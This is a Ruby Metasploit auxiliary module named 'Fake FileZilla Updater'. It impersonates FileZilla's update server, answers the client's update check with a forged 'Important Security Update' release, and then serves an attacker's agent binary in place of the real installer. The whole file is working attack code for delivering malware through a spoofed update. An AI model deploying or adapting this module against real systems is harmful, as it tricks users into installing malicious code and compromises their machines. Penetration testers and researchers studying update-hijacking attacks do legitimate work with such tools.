require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake FileZilla Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake FileZilla updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('DESCRIPTION',    [ false, "Update description shown to user.", "Important Security Update" ]),
			], self.class)
		
		@base = {	
			'vh' => ['update.filezilla-project.org'],
			'request' => [{
				'req' => '(/updatecheck.php?)', 
				'type' => 'string', 
				'bin'    => 0,
				'string' => "release 3.3.<%VERSION%> http://update.filezilla-project.org/filezilla/FileZilla_3.3.<%VERSION%>_win32-setup.exe\n\n3.3.<%VERSION%> (2009-01-07)\n\n- <%DESCRIPTION%>",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			},
			],
			'options' => {  
				'version'  => { 
					'val' => 'RndNum(2)',
					'dynamic' =>1
				},
				'description'  => { 
					'val' => datastore['description'],
					'dynamic' =>0,
				}			    	  
			}
		}
	end
end
